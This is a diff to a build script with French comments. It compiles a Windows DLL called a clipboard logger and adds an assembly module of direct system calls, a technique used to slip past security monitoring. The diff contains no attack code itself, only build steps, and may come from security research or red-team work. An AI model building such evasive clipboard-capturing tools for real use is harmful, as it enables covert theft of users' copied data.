@@ -4,6 +4,9 @@
 # Nom du fichier de sortie
 OUTPUT_DLL="build/clipboard-logger-polling.dll"
 SOURCE_FILE="src/clipboard-logger-polling.c"
+OBJECT_FILE="build/clipboard-logger-polling.o"
+DIRECT_SYSCALLS_SRC=src/direct-syscalls.asm
+DIRECT_SYSCALLS_OBJECT=build/direct-syscalls.o
 
 if [ -d build ]; then
     rm -Rf build
@@ -18,9 +21,13 @@ mkdir build
 # -luser32 -lshell32 -lkernel32 : Bibliothèques Windows nécessaires
 # -static-libgcc : Inclure statiquement la libgcc pour éviter les dépendances externes
 
-echo "Compilation de $SOURCE_FILE vers $OUTPUT_DLL..."
 
-x86_64-w64-mingw32-gcc -shared -o $OUTPUT_DLL $SOURCE_FILE \
+echo "Compilation de la lib de direct syscalls"
+nasm -f win64 $DIRECT_SYSCALLS_SRC -o $DIRECT_SYSCALLS_OBJECT 
+
+echo "Compilation de $SOURCE_FILE vers $OUTPUT_DLL..."
+x86_64-w64-mingw32-gcc -Iinclude -c $SOURCE_FILE -o $OBJECT_FILE
+x86_64-w64-mingw32-gcc -Iinclude -shared -o $OUTPUT_DLL $OBJECT_FILE $DIRECT_SYSCALLS_OBJECT \
     -s -ffunction-sections -fdata-sections -Wl,--gc-sections \
     -luser32 -lshell32 -lkernel32 -luser32 \
     -static-libgcc
